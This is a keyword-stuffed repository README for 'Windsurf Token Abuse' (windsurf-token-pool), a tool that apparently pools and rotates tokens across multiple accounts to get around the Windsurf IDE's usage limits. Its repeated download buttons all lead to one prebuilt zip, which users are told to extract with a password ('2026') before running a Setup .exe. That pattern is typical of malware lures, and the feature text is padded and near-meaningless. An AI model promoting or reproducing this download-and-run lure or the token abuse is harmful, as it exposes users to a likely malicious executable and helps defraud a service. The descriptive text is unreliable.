<div align="center">

# Windsurf Token Abuse — Windsurf Token Abuse — Windsurf Token Abuse (One-Command Setup, Prebuilt Release)

<p><strong>Windsurf Token Abuse — Windsurf Token Abuse — Windsurf Token Abuse (One-Command Setup, Prebuilt Release): Windsurf Token Abuse — windsurf and abuse in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/windsurf-token-pool-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/windsurf-token-pool-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/windsurf-token-pool-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/windsurf-token-pool?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/windsurf-token-pool-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download windsurf-token-pool-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/windsurf-token-pool-v0.1.0-win64.zip"><img src="banner.svg" alt="Windsurf Token Abuse Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Windsurf Token Abuse — Windsurf Token Abuse — windsurf and abuse in one tool** (`windsurf-token-pool`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`windsurf-token-pool-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/windsurf-token-pool-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`windsurf-token-pool-v0.1.0-win64.zip`](../../releases/download/v0.1.0/windsurf-token-pool-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `WindsurfTokenPool_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Configuration (`config/settings.json`)

```json
{
  "module": "windsurf-token-pool",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "pool": {
      "enabled": true
    },
    "accounts": {
      "enabled": true
    },
    "rotate": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## FAQ

<details>
<summary><b>Pool?</b></summary>

Local.
</details>
<details>
<summary><b>Multi-account?</b></summary>

IP binding.
</details>
<details>
<summary><b>IDE?</b></summary>

Compatible.
</details>

## Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/windsurf-token-pool.git
cd windsurf-token-pool
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: windsurf-token-pool, token, abuse, rotation, multi, endless, ai-tools, ide, windsurf, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
